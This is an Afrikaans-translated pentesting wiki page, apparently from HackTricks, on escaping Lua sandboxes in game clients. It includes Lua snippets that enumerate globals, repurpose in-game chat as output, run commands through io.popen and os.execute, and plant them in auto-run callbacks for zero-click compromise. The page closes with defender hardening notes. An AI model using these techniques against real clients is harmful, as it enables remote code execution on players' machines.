# Bypass Lua-sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Hierdie bladsy versamel praktiese tegnieke om Lua-"sandboxes" wat in toepassings ingebed is (veral game clients, plugins of in-app scripting engines) te inventariseer en daaruit te ontsnap. Baie engines stel ’n beperkte Lua-omgewing bloot, maar laat kragtige globals bereikbaar wat arbitrary command execution of selfs native memory corruption moontlik maak wanneer bytecode loaders blootgestel word.

Kernidees:
- Behandel die VM as ’n onbekende omgewing: inventariseer _G en ontdek watter gevaarlike primitives bereikbaar is.
- Wanneer stdout/print geblokkeer word, misbruik enige in-VM UI/IPC channel as ’n output sink om resultate waar te neem.
- Indien io/os blootgestel word, het jy dikwels direkte command execution (io.popen, os.execute).
- Indien load/loadstring/loadfile blootgestel word, kan die uitvoering van crafted Lua bytecode memory safety in sommige weergawes ondermyn (≤5.1 verifiers is omseilbaar; 5.2 het die verifier verwyder), wat advanced exploitation moontlik maak.

## Inventariseer die sandboxed environment

- Dump die global environment om bereikbare tables/functions te inventariseer:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Indien geen print() beskikbaar is nie, hergebruik in-VM-kanale. Voorbeeld uit ’n MMO-behuisingskrip-VM waar kletsuitvoer slegs ná ’n klankoproep werk; die volgende bou ’n betroubare uitvoerfunksie:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Veralgemeen hierdie patroon vir jou teiken: enige tekskassie, toast, logger of UI-callback wat stringe aanvaar, kan as stdout vir verkenning optree.

## Direkte beveluitvoering indien io/os blootgestel is

Indien die sandbox steeds die standaardbiblioteke io of os blootstel, het jy waarskynlik onmiddellike beveluitvoering:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:

- Uitvoering vind binne die client-proses plaas; baie anti-cheat/antidebug-lae wat eksterne debuggers blokkeer, sal nie proseskepping binne die VM voorkom nie.
- Kontroleer ook: package.loadlib (laai van arbitrêre DLL/.so-lêers), require met native modules, LuaJIT se ffi (indien teenwoordig), en die debug-biblioteek (kan voorregte binne die VM verhoog).

## Zero-click triggers via auto-run callbacks

As die host-toepassing scripts na clients stoot en die VM auto-run hooks (bv. OnInit/OnLoad/OnEnter) blootstel, plaas jou payload daar vir ’n drive-by compromise sodra die script laai:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Enige ekwivalente callback (OnLoad, OnEnter, ens.) veralgemeen hierdie tegniek wanneer scripts outomaties op die client versend en uitgevoer word.

## Gevaarlike primitives om tydens recon op te spoor

Kyk spesifiek tydens _G-enumerasie vir:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: voer source of bytecode uit; ondersteun die laai van onbetroubare bytecode.
- package, package.loadlib, require: dynamic library loading en module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, en hooks.
- LuaJIT-only: ffi.cdef, ffi.load om native code direk aan te roep.

Minimale gebruiksvoorbeelde (indien bereikbaar):

Lua se loader API het oor weergawes heen verander: in Lua 5.1 lees `load` vanaf ’n reader function en lees `loadstring` vanaf ’n string; Lua 5.2 se `load` aanvaar óf ’n string óf ’n reader function, en `loadstring` is deprecated as die ekwivalent daarvan.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opsionele eskalasie: misbruik van Lua bytecode loaders

Wanneer load/loadstring/loadfile bereikbaar is, maar io/os beperk word, kan die uitvoering van vervaardigde Lua bytecode lei tot geheue-openbaarmaking en korrupsie-primitiewe. Sleutelfeite:
- Lua ≤ 5.1 het 'n bytecode verifier ingesluit wat bekende omseilings het.<sup>[[4]](#references)</sup>
- Lua 5.2 het die verifier heeltemal verwyder (amptelike standpunt: toepassings behoort voorafgecompileerde chunks eenvoudig te verwerp), wat die aanvaloppervlak vergroot indien bytecode loading nie verbied word nie.<sup>[[2]](#references)[[3]](#references)</sup>
- Werkvloeie behels tipies: lek van pointers via in-VM-uitset, die vervaardiging van bytecode om type confusions te skep (byvoorbeeld rondom FORLOOP of ander opcodes), en dan 'n oorskakeling na arbitrary read/write of native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Hierdie pad is engine-/weergawe-spesifiek en vereis RE. Sien verwysings vir diepgaande ontledings, exploitation primitives en voorbeeld-gadgetry in games.

## Opsporing- en hardening-notas (vir defenders)

- Server side: verwerp of herskryf user scripts; laat slegs veilige APIs toe; verwyder of bind-leeg io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: laat Lua met 'n minimale _ENV loop, verbied bytecode loading, stel 'n streng bytecode verifier of signature checks weer in, en blokkeer process creation vanuit die client process.
- Telemetry: genereer 'n alert vir gameclient → child process creation kort ná script load; korreleer dit met UI/chat/script events.

## References

- [1] [Hierdie huis is spookagtig: 'n dekade-oue RCE in die AION-client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Ontrafeling van Factorio se Lua-sekuriteitsfoute](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Bespreking oor die verwydering van die bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist met verifier-omseilings/notas)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
